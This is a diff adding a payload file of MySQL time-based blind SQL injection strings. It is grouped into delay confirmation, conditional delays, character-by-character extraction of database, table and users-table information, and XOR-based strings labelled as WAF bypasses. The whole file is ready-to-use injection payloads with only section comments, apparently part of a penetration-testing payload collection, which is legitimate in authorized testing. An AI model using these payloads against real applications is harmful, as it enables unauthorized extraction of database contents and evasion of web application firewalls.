@@ -1,0 +1,27 @@
+# MySQL — Time-Based Blind Payloads
+# Confirm by observing response delay (default 5s)
+
+# --- Basic delay confirmation ---
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+'; SELECT SLEEP(5)--
+1 AND SLEEP(5)--
+1' AND SLEEP(5)='
+
+# --- Conditional delay (confirms boolean logic works) ---
+' AND IF(1=1,SLEEP(5),0)--
+' AND IF(1=2,SLEEP(5),0)--
+' AND IF(version() LIKE '5%',SLEEP(5),0)--
+' AND IF(version() LIKE '8%',SLEEP(5),0)--
+
+# --- Data extraction via timing ---
+' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
+' AND IF(ASCII(SUBSTRING(database(),1,1))>96,SLEEP(5),0)--
+' AND IF(LENGTH(database())=5,SLEEP(5),0)--
+' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u',SLEEP(5),0)--
+' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--
+
+# --- XOR-based (WAF bypass) ---
+'XOR(if(now()=sysdate(),sleep(5),0))XOR'
+'||(SELECT 0x74657374 WHERE 1=1 AND SLEEP(5))--
+0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'
